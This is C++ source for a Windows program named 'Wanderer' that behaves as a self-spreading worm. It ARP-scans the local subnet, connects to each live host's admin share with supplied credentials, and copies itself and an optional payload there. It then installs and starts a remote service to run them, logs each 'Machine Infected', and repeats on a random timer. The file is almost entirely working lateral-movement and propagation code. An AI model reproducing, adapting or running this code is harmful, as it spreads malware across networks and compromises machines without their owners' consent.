#include "Wanderer.h"

//Globals
//Vector to hold list of ips that respond to arp. MUST check mutex before using.
std::vector<char*> arpRespones; 
HANDLE arpMutex;
//Vector to hold list of ips to arpscan
std::vector<char*> possibleHosts;

bool InstallAndStartRemoteService(std::wstring remoteServer,std::wstring serviceName,std::string payloadName){
	if(payloadName != "")
		payloadName.insert(0,INSTALL_LOCATION);
	SERVICE_STATUS status = {0};
	SC_HANDLE hSCM = ::OpenSCManager(remoteServer.c_str(), NULL, SC_MANAGER_ALL_ACCESS);
	if(hSCM == NULL) {
		logFile.LogError("Failed to open service manager on remote machine. ",GetLastError());
		return false;
	}
	
	//Check to see if service already exists by opening it
	SC_HANDLE hService =::OpenService(hSCM,serviceName.c_str(),SERVICE_ALL_ACCESS);
	if(hService==NULL){ //failed to open service, Install
		//Setup info
		DWORD serviceType = SERVICE_WIN32_OWN_PROCESS;
		std::wstring servicePath = charToWchar(INSTALL_LOCATION) + serviceName + L".exe " + \
			charToWchar(SERVICE_FLAG) + L" " +charToWchar(USERNAME_FLAG) + L" "+ \
			charToWchar(cmdOpts.username) + L" " +charToWchar(PASSWORD_FLAG) + L" " + \
			charToWchar(cmdOpts.password) + L" " + charToWchar(PAYLOAD_FLAG) + L" "+ \
			charToWchar(payloadName.c_str());

		hService = ::CreateService(hSCM,serviceName.c_str(),serviceName.c_str(),\
			SERVICE_ALL_ACCESS,serviceType,SERVICE_DEMAND_START,SERVICE_ERROR_NORMAL,\
			servicePath.c_str(),NULL,NULL,NULL,NULL,NULL);

		if(hService==NULL){
			::CloseServiceHandle(hSCM);
			logFile.LogError("Error creating service ",GetLastError());
			return false;
		}
	} else { //Found service, check if its started or not.
		if(!QueryServiceStatus(hService,&status)){ 
			//Failed to get status, attempt next step
			logFile.LogError("Error query service status. ",GetLastError());
		}else{ //got status check if started
			if(status.dwCurrentState != SERVICE_STOPPED && status.dwCurrentState != SERVICE_STOP_PENDING){
				::CloseServiceHandle(hService);
				::CloseServiceHandle(hSCM);
				return true; //service started and runnning
			}
		}
	}

	//Service was either found already not started or has been installed, run
	if(!StartService(hService,0,NULL)){
		logFile.LogError("Error starting servcie. ",GetLastError());
		::CloseServiceHandle(hSCM);
		return false;
	}

	::CloseServiceHandle(hService);
	::CloseServiceHandle(hSCM);
	return true; //service started and runnning
}

int wandererMain(){
	
	
	DWORD dwWaitResult;
	srand((unsigned int) time(NULL));
	//Create Mutex for each thread to be able to write results.
	arpMutex = CreateMutex(NULL,FALSE,NULL);
	if(arpMutex == NULL){
		logFile.EpicFail("CreateMutex failed. ",GetLastError());
	}

	//if given, execute payload
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si,sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi,sizeof(pi));
	if(cmdOpts.payloadPath != NULL){
		if(!CreateProcess(NULL,charToWchar(cmdOpts.payloadPath),NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi))
			logFile.LogError("Failed to execute payload.",GetLastError());
	}

	std::vector<networkInfo> localInterfaces = getInterfaceInfo();
	if(localInterfaces.size() ==0){
		logFile.LogError("Could not get local IP address. Exiting...");
		return -1; //Error coudln't get local IP
	}

	//Assuming first interface. TODO: Code to check if each interface is up and use up interface
	char* localIp = localInterfaces[0].ip;
	getIpsToScan(localInterfaces[0]); 

	do{
		std::vector<char*> hosts; //reset host vector each loop
		startArpScan(possibleHosts);
		//Copy out what we need from the arpscan results, so we don't need to hold on to the mutex for long
		dwWaitResult = WaitForSingleObject(arpMutex,INFINITE);
		switch(dwWaitResult){
			//Thread got ownership
		case WAIT_OBJECT_0:
			hosts.swap(arpRespones); //copy arpResponse vector and reset for next run
			//Done reading, release mutex
			if(!ReleaseMutex(arpMutex))
				logFile.LogError("Error Releaseing mutex",GetLastError());
			break;
		case WAIT_ABANDONED:
			logFile.EpicFail("Abandoned Mutex!!");
			break; //useless
		default:
			logFile.EpicFail("Unknown Mutex State!!");
		}

		for(std::vector<char*>::iterator it = hosts.begin(); it != hosts.end(); ++it) {
			if(!compare(localIp,*it)){ //Make sure the IP is not ourself
				//connect to share
				WCHAR* dest = ipToSharePath(*it);
				std::string payloadName = "";
				if(connectToShare(dest,charToWchar(cmdOpts.username),charToWchar(cmdOpts.password))){ //check that we connected
					//copy myself to share
					std::wstring destFileName = createDestFileName(dest,DEST_FILENAME); 

					if(CopyFile(charToWchar(cmdOpts.origPath),destFileName.c_str(),FALSE)==0) //failed
						logFile.LogError("Error copying file to remote server: ",GetLastError());
					else{
						//Wanderer copied, now payload
						//create file name and path for payload
						if(cmdOpts.payloadPath != NULL){
							std::string payloadPath(cmdOpts.payloadPath);
							std::vector<std::string> tempSplit = split(payloadPath,'\\'); 
							payloadName = tempSplit[tempSplit.size()-1];
							std::wstring payloadDestFileName = createDestFileName(dest,payloadName.c_str());
							//Copy payload
							if(CopyFile(charToWchar(cmdOpts.payloadPath),payloadDestFileName.c_str(),FALSE)==0) //failed
								logFile.LogError("Error copying payload to remote server: ",GetLastError());
						}
						std::wstring remoteServer = charToWchar(*it);
						remoteServer = L"\\\\" + remoteServer;
						if(InstallAndStartRemoteService(remoteServer,SERVICE_NAME,payloadName))
							logFile.LogDebug("Machine Infected: ",*it);
					}
				}
				else
					logFile.LogDebug("Can't connect to share: ",*it);
			}
		}
		Sleep((DWORD)GetRandom(SLEEP_MIN,SLEEP_MAX)); //Wait to run again for a random amount of time to avoid everyone scannign at once.
	}while(cmdOpts.isService); //if service, repeat every so often to discover new hosts
	logFile.LogDebug(L"Exiting..");
	//out.close();
	CloseHandle(arpMutex);
	return 0;

}

WCHAR* ipToSharePath(char* ip){
	std::string s(ip);
	std::wstring wc(s.begin(),s.end());
	wc.insert(wc.length(),SHARE_PATH);
	wc.insert(0,L"\\\\");
	WCHAR* wstr = new WCHAR[wc.length()+1]; 
	wcscpy_s(wstr,wc.length()+1,wc.c_str());
	return wstr;
}

//Expects file path to be fully qualified path
std::wstring createDestFileName(WCHAR* orig,const char* filePath){

	std::wstring a = orig;
	std::wstring b = charToWchar(filePath);
	std::vector<std::wstring> path = split(b,L'\\');
	std::wstring c = a + L"\\" + path[path.size()-1];
	return c;
}



void fourth_octet(int ip0, int ip1, int ip2, int i, int mask) {    

    while ( i < mask) {
			i++; //dont add .0
			std::string fullIp = INT2STR(ip0) + "." + INT2STR(ip1) +"."+INT2STR(ip2)+"." + INT2STR(i);
			char* temp = new char[fullIp.length() +1];
			strcpy_s(temp,fullIp.length()+1,fullIp.c_str());
			possibleHosts.push_back(temp);
	}
		//remove last .255
		possibleHosts.pop_back();
}

void third_octet(int ip0,int ip1,int i,int mask) {

    while (i < mask ) { 
				i++;
        fourth_octet(ip0, ip1, i, 0,255);
       
    }
}

void second_octet(int ip0,int i,int mask){
    while (i < mask ) {
			i++;
      third_octet(ip0, i, 0, 255);
        
    }
}

void first_octet(int i, int mask) {

    while (i<mask ) {
			i++;
      second_octet(i, 0, 0);

    }
}

void getIpsToScan(networkInfo localIp) {

	//convert IP to string for easier parsing
	std::string tempIp(localIp.ip);
	std::string mask(localIp.mask);
	std::string fullIp;
	int numOfSubsets = 0;
	int x = 0; //starting place for mask counter
	int maxMask = 255;

	//Section is setup to walk though every possible IP in a given subnet mask
	//However doing so is very resource intensive and ill advised, therefore has been modified to only fill IP address at max for 255.255.0.0 subnet
	//Does not consider 255.255.128.0 different from 255.255.0.0. Will generate all IPs regardless.

	std::vector<std::string> maskSplit =  split(mask,'.'); //split based on 0 to figure out which class
	std::vector<std::string> ipSplit = split(tempIp,'.');

	for(int i = 0; i <4;i++){

		if (maskSplit[i] !="255")
    {        
        if (i==0) {
					//first_octet(i, mask[i]); //dont want to calculate that many ips
				} //first octect
        else if (i==1) {
					//second_octet(str2int(ipSplit[0]),x,str2int(maskSplit[i])); //dont want to calculate that many ips
				} //second octect
        else if (i==2) {
					third_octet(str2int(ipSplit[0]),str2int(ipSplit[1]),x,maxMask/*str2int(maskSplit[i])*/);
				} //third
        else {
					fourth_octet(str2int(ipSplit[0]),str2int(ipSplit[1]), str2int(ipSplit[2]),x,maxMask/*str2int(maskSplit[i])*/); 
				} //forth
        
    }   

	}

}


//Multi threaded arpscan.
void startArpScan(std::vector<char*> input){

	HANDLE *threads;
	unsigned int numOfThreads, processedThreads =0;
	DWORD ret = 0;
	unsigned int i;

	//Can only Process 64 threads at a time in order to use WaitForMultipleObjects
	if(input.size() > MAX_THREADS){
		numOfThreads = MAX_THREADS;
	}
	else
		numOfThreads = input.size();
	threads = (HANDLE*)calloc(numOfThreads,sizeof(HANDLE));

	//Create thread for each ip address to scan. 
	while(processedThreads < input.size()) {
	for(i = 0; i < numOfThreads; i++){
			threads[i]=CreateThread(NULL,0, (LPTHREAD_START_ROUTINE)aprscan,input[processedThreads],0,NULL);
			if(threads[i] == NULL){
				logFile.LogError("CreateThread errored. ",GetLastError());
				return;
			}
			processedThreads++;
		}
	
		//Wait for all threads to terminate
		ret = WaitForMultipleObjects(numOfThreads, threads, TRUE, INFINITE);
		//Close Threads
		for(i = 0; i < numOfThreads; i++)
			CloseHandle(threads[i]);
		
		//Setup for next intteration. 
		if(input.size()-processedThreads > MAX_THREADS)
			numOfThreads = MAX_THREADS;
		else
			numOfThreads = input.size()-processedThreads;

		threads = (HANDLE*)calloc(numOfThreads,sizeof(HANDLE));
	}
	free(threads);
}

DWORD WINAPI aprscan(char* ip){

		struct in_addr destip;
		destip.s_addr = inet_addr(ip);
    IPAddr srcip;
    ULONG MacAddr[2];
    ULONG PhyAddrLen = 6;  /* default to length of six bytes */
		DWORD dwWaitResult;
    srcip = 0;
		DWORD ret;
		logFile.LogDebug("Scanning for: ",ip);
    //Send an arp packet
    ret = SendARP((IPAddr) destip.S_un.S_addr , srcip , MacAddr , &PhyAddrLen);
		//Parse error code
		switch(ret){
			case NO_ERROR: //If no error write ip to vector
				dwWaitResult = WaitForSingleObject(arpMutex,INFINITE);
				switch(dwWaitResult){
					//Thread got ownership
				case WAIT_OBJECT_0:
					arpRespones.push_back(ip); //write to vector
					//Done writing, release mutex
					if(!ReleaseMutex(arpMutex))
						logFile.LogError("Error Releaseing mutex",GetLastError());
					break;
				case WAIT_ABANDONED:
					logFile.EpicFail("Abandoned Mutex!!");
					break; //useless
				default:
					logFile.EpicFail("Unknown Mutex State!!");
				}

				break;
			case ERROR_BAD_NET_NAME:
				break;
			default:
				logFile.LogError(L"SendARP failed! ",ret);
				break;
		};

		return true;


}